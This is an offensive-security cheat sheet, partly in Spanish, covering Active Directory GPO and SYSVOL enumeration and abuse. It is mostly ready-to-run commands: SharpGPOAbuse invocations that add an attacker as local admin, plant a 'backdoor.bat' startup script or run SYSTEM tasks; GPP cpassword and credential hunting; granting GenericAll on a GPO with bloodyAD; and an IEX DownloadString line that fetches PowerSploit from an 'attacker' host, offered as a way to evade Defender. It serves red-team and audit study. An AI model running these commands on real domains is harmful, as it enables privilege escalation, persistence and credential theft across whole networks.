---
aliases:
  - GPO Tooling
  - SharpGPOAbuse
  - Get-GPPPassword
  - BloodHound GPO
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - GPO y SYSVOL Enumeration]]"
  - "[[GPO Abuse]]"
---
# AD - GPO & SYSVOL Enumeration - Tooling

***

## RSAT / PowerShell

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `Get-GPO -All` | All GPOs | Standard. |
| `Get-GPO -DisplayName X` | Specific GPO | Standard. |
| `Get-GPOReport -GUID X -ReportType XML` | XML report | Standard. |
| `Get-GPOReport -GUID X -ReportType HTML` | HTML report | Standard. |
| `Get-GPOReport -All -ReportType HTML -Path c:\report.html` | All to HTML | Adjacent. |
| `Get-GPInheritance -Target "OU=X"` | Per-OU GPO list | Standard. |
| `gpresult /h policy.html` | Per-host RSoP | Standard. |
| `gpresult /v` | Verbose RSoP | Standard. |
| `gpresult /scope user` | User-side | Standard. |
| `gpresult /scope computer` | Computer-side | Standard. |
| `gpupdate /force` | Force apply | Standard. |
| `New-GPO` | Create (privileged) | Privileged. |
| `New-GPLink -Target OU -Name GPO` | Link to OU | Privileged. |
| `Remove-GPLink` | Unlink | Privileged. |
| `Set-GPPermission` | Modify ACL | Privileged. |
| `Get-GPPermission -Name GPO -All` | List ACL | Standard. |
^ad-gpotool-rsat

### RSAT comprehensive

```powershell
# All GPOs + status
Get-GPO -All | Select DisplayName,Id,GpoStatus,CreationTime,ModificationTime

# Per-GPO XML
Get-GPOReport -Guid (Get-GPO "Default Domain Policy").Id -ReportType XML | Out-File DDP.xml

# Per-OU inheritance
Get-GPInheritance -Target "OU=Workstations,DC=dom,DC=local"

# Per-OU all linked GPOs (recursive)
Get-ADOrganizationalUnit -Filter * -Properties gPLink |
  Where {$_.gPLink} |
  Select Name,gPLink

# Per-host RSoP
gpresult /h policy.html
```

___

## PowerView (Adversary)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `Get-DomainGPO` | All GPOs | Adversary. |
| `Get-DomainGPO -ResolveGUIDs` | Resolved | Adjacent. |
| `Get-DomainGPO -GPOName X` | Specific | Standard. |
| `Get-DomainGPOLocalGroup` | Local group GPOs | Adjacent. |
| `Get-DomainGPOUserLocalGroupMapping` | Per-user GPO scope | Standard. |
| `Get-DomainGPOComputerLocalGroupMapping` | Per-computer GPO scope | Standard. |
| `Get-DomainOU -Properties gplink` | Per-OU GPO links | Standard. |
| `Find-GPOLocation -Identity user` | Find GPOs affecting user | Adjacent. |
| `Find-GPOComputerAdmin -ComputerName host` | Local admin GPOs per host | Lateral. |
| `Find-InterestingDomainAcl` | ACL paths to GPO modify | Adjacent. |
| Modern: BloodHound preferred | Standard | Tool. |
| Adjacent: ACL Enumeration hub | Cross-ref | Adjacent. |
| OPSEC: in-memory load | Defender evasion | Adjacent. |
| Detection: PowerView signatures | Defender | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
^ad-gpotool-powerview

### PowerView GPO queries

```powershell
Import-Module .\PowerView.ps1

# All GPOs
Get-DomainGPO -ResolveGUIDs |
  Select displayName,name,whenCreated,whenChanged

# GPOs that grant local admin per-host
Find-GPOComputerAdmin -ComputerName victim-host

# GPOs affecting specific user
Find-GPOLocation -Identity targetuser

# GPO ACL paths
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dom,DC=local" -ResolveGUIDs |
  Where ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner"
```

___

## BloodHound / SharpHound

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `SharpHound -c Default` | Includes GPO | Standard. |
| `SharpHound -c All` | Comprehensive | Standard. |
| `SharpHound -c GPOLocalGroup` | GPO local group mapping | Adjacent. |
| RustHound (Linux) | `rusthound -d dom -u u -p p --zip` | Modern. |
| BloodHound.py | `bloodhound-python -c All` | Linux. |
| Cypher: GPO paths | Standard | Tool. |
| Visual graph | Per-edge | Tool. |
| BloodHound CE 5.x+ GPO support | Modern | Tool. |
| BHCE 6.x improved | Modern | Tool. |
| Custom analytics | Cypher | Tool. |
| Pre-built GPO queries | Standard | Tool. |
| Per-domain ingest | Multi-domain | Adjacent. |
| Cross-correlate priv | Standard | Tool. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Modern: continuous BHCE | Defender | Standard. |
| Compliance: GPO baseline | Standard | Adjacent. |
^ad-gpotool-bh

### BloodHound GPO queries

```cypher
// All GPO modify paths
MATCH (u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns*1..]->(g:GPO)
RETURN u.name, g.name

// GPOs linked to highvalue OUs
MATCH (g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer {highvalue: true})
RETURN g.name, ou.name, c.name

// Owned principal can modify GPO → highvalue impact
MATCH (u {owned: true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|MemberOf*1..]->(g:GPO)
MATCH (g)-[:GpLink]->(ou:OU)-[:Contains*1..]->(target {highvalue: true})
RETURN u.name, g.name, ou.name, target.name
```

___

## SharpGPOAbuse (Privesc)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `SharpGPOAbuse.exe --AddUserRights "SeDebugPrivilege" --UserAccount attacker --GPOName VulnGPO` | User rights modify | Privesc. |
| `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName VulnGPO` | Add local admin | Privesc. |
| `SharpGPOAbuse.exe --AddComputerScript --ScriptName backdoor.bat --GPOName VulnGPO` | Add startup script | Persist. |
| `SharpGPOAbuse.exe --AddUserScript --ScriptName logon.bat --GPOName VulnGPO` | Add logon script | Persist. |
| `SharpGPOAbuse.exe --AddComputerImmediateTask --TaskName Backup --Author "SYSTEM" --Command cmd.exe --Arguments "/c whoami" --GPOName VulnGPO` | Immediate task | Privesc. |
| Affects all OU members on next gpupdate | Mass compromise | Critical. |
| Cleanup: revert modifications | Standard | OPSEC. |
| Detection: GPO modify events | Defender | Adjacent. |
| Cross-correlate with priv tier | Standard | Audit. |
| Adjacent: GPO Abuse hub | Cross-ref | Adjacent. |
| Modern: minimal modify rights | Hardening | Standard. |
| Per-quarter audit | Standard | Compliance. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit log retention | Standard | Adjacent. |
| Modern: extreme alerting | Critical | Standard. |
| Per-engagement documentation | Standard | OPSEC. |
^ad-gpotool-sharpgpoabuse

### SharpGPOAbuse usage

```cmd
:: Add local admin via GPO
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount dom\attacker --GPOName "Workstation Policy"

:: Add immediate scheduled task
SharpGPOAbuse.exe --AddComputerImmediateTask --TaskName "BackupTask" --Author "SYSTEM" ^
  --Command "cmd.exe" --Arguments "/c net localgroup administrators dom\attacker /add" ^
  --GPOName "Workstation Policy"

:: Force gpupdate on victim
:: gpupdate /force (on victim host)

:: Cleanup
SharpGPOAbuse.exe --DeleteComputerImmediateTask --TaskName "BackupTask" --GPOName "Workstation Policy"
```

___

## netexec / crackmapexec

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `nxc smb DC -u u -p p -M gpp_password` | GPP cpassword discovery | Standard. |
| `nxc smb DC -u u -p p -M gpp_autologin` | AutoLogin creds | Adjacent. |
| `nxc ldap DC -u u -p p --gpo` | GPO list | Quick. |
| `nxc smb DC -u u -p p --shares | grep SYSVOL` | SYSVOL access | Standard. |
| `nxc smb DC -u u -p p -M spider_plus -o INTERESTING_EXTENSIONS=xml` | XML spider | Targeted. |
| Authenticated baseline | Standard | Reliable. |
| Modern netexec preferred | Standard | Standard. |
| Cross-correlate with SYSVOL discovery | Standard | Audit. |
| Detection: bulk SMB reads | Defender | Adjacent. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
| Adjacent: SYSVOL Content hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
| Verbose `-v` | Debug | Standard. |
| `--continue-on-success` | Multi-host | Standard. |
| Forest-wide via different DCs | Per-domain | Adjacent. |
^ad-gpotool-netexec

### netexec recipes

```bash
DC="dc01.dom.local"

# GPP cpassword (auto-decrypt)
nxc smb $DC -u user -p pass -M gpp_password

# AutoLogin creds
nxc smb $DC -u user -p pass -M gpp_autologin

# SYSVOL spider (XML files)
nxc smb $DC -u user -p pass -M spider_plus -o INTERESTING_EXTENSIONS=xml,ini,bat,ps1
```

___

## Get-GPPPassword (PowerSploit)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `Import-Module PowerSploit` | Load | Adjacent. |
| `Get-GPPPassword` | Auto-discover + decrypt | Standard. |
| `Get-GPPPassword -DomainController DC` | Specific DC | Adjacent. |
| Output: cleartext per file | Standard | Standard. |
| Adversary-classic | Red team | Standard. |
| OPSEC: in-memory load | Defender evasion | Adjacent. |
| `IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerSploit.ps1')` | In-memory | Edge. |
| Detection: PowerSploit signatures | Defender | Adjacent. |
| Modern: certipy / netexec preferred | Standard | Standard. |
| Cross-correlate with SYSVOL spider | Standard | Audit. |
| Adjacent: GPP cpassword hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit baseline | Standard | Compliance. |
| Modern: PowerSploit may flagged | EDR | Adjacent. |
| Cleanup post-engagement | Standard | OPSEC. |
| BloodHound integration adjacent | Modern | Tool. |
^ad-gpotool-getgpp

### Get-GPPPassword

```powershell
Import-Module .\PowerSploit\PowerSploit.psd1
Get-GPPPassword

# Output:
# Passwords: {Pa$$w0rd123}
# UserNames: {admin}
# File: \\dom\SYSVOL\dom\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
# Changed: 2014-01-01 00:00:00
```

___

## Snaffler (Modern Auto-Discovery)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `Snaffler.exe -s` | Console output | Standard. |
| `Snaffler.exe -s -u` | Self-update | Standard. |
| `Snaffler.exe -s -u -o snaffler.log` | Output to file | Reportable. |
| Auto-discovers shares + sensitive files | Comprehensive | Standard. |
| Built-in cred patterns | Pre-defined | Standard. |
| Custom regex via `--rules` | Flexible | Adjacent. |
| Targets SYSVOL + NETLOGON + other shares | Comprehensive | Standard. |
| Per-extension filtering | Standard | Standard. |
| Modern alternative to manual grep | Best practice | Standard. |
| OPSEC: bulk share read = SIEM flag | Defender | Adjacent. |
| Targeted vs bulk trade-off | OPSEC | Standard. |
| Cleanup not needed (read-only) | Standard | OPSEC. |
| Detection: Snaffler signatures | Defender | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cross-correlate with manual hunt | Standard | Audit. |
| Modern: industry-standard tool | Standard | Tool. |
^ad-gpotool-snaffler

### Snaffler usage

```powershell
# Comprehensive scan
.\Snaffler.exe -s -u -o snaffler.log

# Targeted: specific shares
.\Snaffler.exe -s -u -i "SYSVOL\\dom" -o sysvol_snaffler.log

# Custom rules
.\Snaffler.exe -s -u --custom-rules custom_rules.toml -o custom.log
```

___

## bloodyAD (Linux LDAP Modify)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `bloodyAD ... add gpcfilesyspath ...` | SYSVOL link modify | Edge. |
| `bloodyAD ... add genericAll GPO principal` | ACL grant | Privileged. |
| `bloodyAD ... get object DN --resolve-sd` | DACL read | Standard. |
| Linux-friendly | Standard | Standard. |
| Authenticated NTLM/Kerberos | Standard | Standard. |
| LDAPS support | Modern | Standard. |
| Cross-domain | Per-domain | Adjacent. |
| Modern Linux preferred | Standard | Standard. |
| Adjacent: ACL Enumeration hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cleanup: revert modifications | Standard | OPSEC. |
| Detection: bulk LDAP modify | Defender | Adjacent. |
| Audit baseline | Standard | Compliance. |
| Cross-correlate priv | Standard | Audit. |
| Adjacent: GPO Abuse hub | Cross-ref | Adjacent. |
| Modern: extreme alerting | Best practice | Standard. |
^ad-gpotool-bloodyad

### bloodyAD GPO

```bash
# Read GPO DACL
bloodyAD --host DC -d dom -u user -p pass \
  get object "CN={GUID},CN=Policies,CN=System,DC=dom,DC=local" --resolve-sd

# Grant GenericAll on GPO (privileged abuse)
bloodyAD --host DC -d dom -u user -p pass \
  add genericAll "CN={GUID},CN=Policies,CN=System,DC=dom,DC=local" attacker
```

___

## Linux SMB Tools (SYSVOL)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `smbclient //DC/SYSVOL -U user` | Browse | Standard. |
| `smbclient //DC/SYSVOL -U user -W dom -c 'ls'` | One-shot | Standard. |
| `smbmap -H DC -u user -p pass -R SYSVOL` | Recurse | Standard. |
| `smbmap -H DC -u user -p pass -R SYSVOL --depth 5 -A '\.xml$\|\.ini$'` | Filter | Targeted. |
| `mount -t cifs //DC/SYSVOL /mnt/sysvol -o user=user,pass=pass` | Mount | Standard. |
| `find /mnt/sysvol -type f -name "*.xml"` | Linux find | Standard. |
| `grep -r "cpassword" /mnt/sysvol --include="*.xml"` | Linux grep | Standard. |
| `manspider` | Linux Snaffler-equivalent | Adjacent. |
| `nxc smb DC -u u -p p -M spider_plus` | netexec spider | Modern. |
| `findstr /S /M cpassword \\dom\SYSVOL\dom\Policies\*.xml` | Native Windows | Standard. |
| Cross-correlate with manual hunt | Standard | Audit. |
| Detection: bulk SMB reads | Defender | Adjacent. |
| OPSEC: per-engagement scope | Standard | OPSEC. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cleanup not needed (read-only) | Standard | OPSEC. |
| Adjacent: SYSVOL Content hub | Cross-ref | Adjacent. |
^ad-gpotool-linuxsmb

### Linux SYSVOL pipeline

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"

# Mount SYSVOL
sudo mkdir /mnt/sysvol
sudo mount -t cifs //DC/SYSVOL /mnt/sysvol -o user=$USER,pass=$PASS,domain=dom

# Hunt cpassword
grep -r "cpassword" /mnt/sysvol --include="*.xml" 2>/dev/null

# Hunt embedded creds
grep -ri "password\|secret\|pwd\|api_key" /mnt/sysvol --include="*.xml" \
  --include="*.ini" --include="*.bat" --include="*.ps1" --include="*.config" 2>/dev/null

# Audit GPO scripts
find /mnt/sysvol -type d -name "Scripts" -exec ls -la {} \;
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks - GPO | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql` adjacent | Reference. |
| HackTricks - GPO Abuse | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/grouppolicypreferences` | Standard. |
| The Hacker Recipes - GPO | `thehacker.recipes/ad/movement/group-policy` | Comprehensive. |
| ADSecurity (Sean Metcalf) | `adsecurity.org` | Defender intel. |
| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
| SharpGPOAbuse | `github.com/FSecureLABS/SharpGPOAbuse` | Tool. |
| PowerSploit Get-GPPPassword | `github.com/PowerShellMafia/PowerSploit` | Tool. |
| Snaffler | `github.com/SnaffCon/Snaffler` | Tool. |
| Microsoft - GPO Best Practices | `learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy-management-tools` | Vendor. |
| MS14-025 (GPP cpassword patch) | Microsoft KB | Reference. |
| PingCastle GPO section | `www.pingcastle.com` | Audit. |
| Purple Knight GPO | `www.semperis.com/purple-knight/` | Audit. |
| Microsoft Defender for Identity GPO alerts | Modern | Defender. |
| MITRE ATT&CK T1484.001 | Domain Policy Modification | Adjacent. |
| `awesome-active-directory` | GitHub | Foundation. |
| MS-GPPREF spec (cpassword key) | Microsoft public spec | Reference. |
^ad-gpotool-resources

***
